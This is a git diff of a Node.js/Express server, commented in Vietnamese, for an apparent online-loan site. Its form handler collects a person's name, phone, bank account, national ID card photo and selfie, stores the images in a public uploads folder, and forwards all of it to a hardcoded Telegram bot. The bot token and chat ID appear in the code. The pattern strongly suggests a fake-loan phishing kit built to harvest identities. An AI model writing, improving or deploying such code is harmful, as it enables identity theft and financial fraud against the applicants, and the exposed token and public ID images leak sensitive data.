@@ -8,10 +8,11 @@ const https = require('https');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// === THAY THÔNG TIN TELEGRAM CỦA BẠN VÀO 2 DÒNG DƯỚI ===
-const TELEGRAM_BOT_TOKEN = '8999331195:AAFgHthGvHsksplYrygVPrRFPj3JY9ltHL4'; 
-const TELEGRAM_CHAT_ID = '8999331195'; 
+// === THAY TOKEN & CHAT ID TELEGRAM Ở 2 DÒNG NÀY ===
+const TELEGRAM_BOT_TOKEN = '8999331195:AAFgHthGvHsksplYrygVPrRFPj3JY9ltHL4';
+const TELEGRAM_CHAT_ID = '8999331195';
 
+// Tạo thư mục uploads nếu chưa có
 if (!fs.existsSync('./uploads')) {
     fs.mkdirSync('./uploads');
 }
@@ -26,6 +27,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// Cấu hình lưu file upload
 const storage = multer.diskStorage({
     destination: (req, file, cb) => cb(null, 'uploads/'),
     filename: (req, file, cb) => {
@@ -35,7 +37,7 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage: storage });
 
-// Gửi Telegram bằng module https mặc định (Không lo lỗi MODULE_NOT_FOUND)
+// Hàm gửi tin nhắn Telegram chuẩn HTTPS
 function sendTelegramMessage(text) {
     return new Promise((resolve) => {
         const data = JSON.stringify({
@@ -69,14 +71,15 @@ function sendTelegramMessage(text) {
     });
 }
 
+// Route xử lý form vay
 app.post('/api/submit-loan', upload.fields([
     { name: 'cccdFront', maxCount: 1 },
     { name: 'selfie', maxCount: 1 }
 ]), async (req, res) => {
     try {
         const { amount, days, fullName, phone, bankAccount, bankName } = req.body;
-        const cccdFile = req.files['cccdFront'] ? req.files['cccdFront'][0].filename : null;
-        const selfieFile = req.files['selfie'] ? req.files['selfie'][0].filename : null;
+        const cccdFile = req.files && req.files['cccdFront'] ? req.files['cccdFront'][0].filename : '';
+        const selfieFile = req.files && req.files['selfie'] ? req.files['selfie'][0].filename : '';
         const loanId = 'VAY' + Date.now().toString().slice(-6);
 
         const host = req.get('host');
@@ -86,11 +89,11 @@ app.post('/api/submit-loan', upload.fields([
         const message = `
 🔥 <b>HỒ SƠ VAY MỚI: #${loanId}</b>
 ----------------------------------
-👤 <b>Họ tên:</b> ${fullName.toUpperCase()}
-📞 <b>SĐT:</b> <code>${phone}</code>
-💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} đ (${days} ngày)
-🏦 <b>Ngân hàng:</b> ${bankName}
-💳 <b>STK:</b> <code>${bankAccount}</code>
+👤 <b>Họ tên:</b> ${(fullName || '').toUpperCase()}
+📞 <b>SĐT:</b> <code>${phone || ''}</code>
+💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount || 0)} đ (${days || 0} ngày)
+🏦 <b>Ngân hàng:</b> ${bankName || ''}
+💳 <b>STK:</b> <code>${bankAccount || ''}</code>
 ----------------------------------
 🖼 <b>Ảnh CCCD:</b> ${baseUrl}/uploads/${cccdFile}
 🤳 <b>Ảnh Selfie:</b> ${baseUrl}/uploads/${selfieFile}
@@ -99,54 +102,11 @@ app.post('/api/submit-loan', upload.fields([
         await sendTelegramMessage(message);
         res.json({ success: true, message: 'Thành công', loanId: loanId });
     } catch (error) {
+        console.error('Lỗi Submit:', error);
         res.status(500).json({ success: false, message: 'Lỗi server' });
     }
 });
 
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
-        });
-    } catch (err) { console.error('Lỗi Telegram:', err); }
-}
-
-app.post('/api/submit-loan', upload.fields([
-    { name: 'cccdFront', maxCount: 1 },
-    { name: 'selfie', maxCount: 1 }
-]), async (req, res) => {
-    try {
-        const { amount, days, fullName, phone, bankAccount, bankName } = req.body;
-        const cccdFile = req.files['cccdFront'] ? req.files['cccdFront'][0].filename : null;
-        const selfieFile = req.files['selfie'] ? req.files['selfie'][0].filename : null;
-        const loanId = 'VAY' + Date.now().toString().slice(-6);
-
-        // Lấy domain website hiện tại để tạo link ảnh
-        const host = req.get('host');
-        const protocol = req.protocol;
-        const baseUrl = `${protocol}://${host}`;
-
-        const message = `
-🔥 <b>HỒ SƠ VAY MỚI: #${loanId}</b>
-----------------------------------
-👤 <b>Họ tên:</b> ${fullName.toUpperCase()}
-📞 <b>SĐT:</b> <code>${phone}</code>
-💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} đ (${days} ngày)
-🏦 <b>Ngân hàng:</b> ${bankName}
-💳 <b>STK:</b> <code>${bankAccount}</code>
-----------------------------------
-🖼 <b>Ảnh CCCD:</b> ${baseUrl}/uploads/${cccdFile}
-🤳 <b>Ảnh Selfie:</b> ${baseUrl}/uploads/${selfieFile}
-        `;
-
-        await sendTelegramMessage(message);
-        res.json({ success: true, message: 'Thành công', loanId: loanId });
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Lỗi server' });
-    }
+app.listen(PORT, () => {
+    console.log(`Server đang chạy tại port ${PORT}`);
 });
-// Khai báo đường dẫn trả về trang chủ index.html
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-    
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
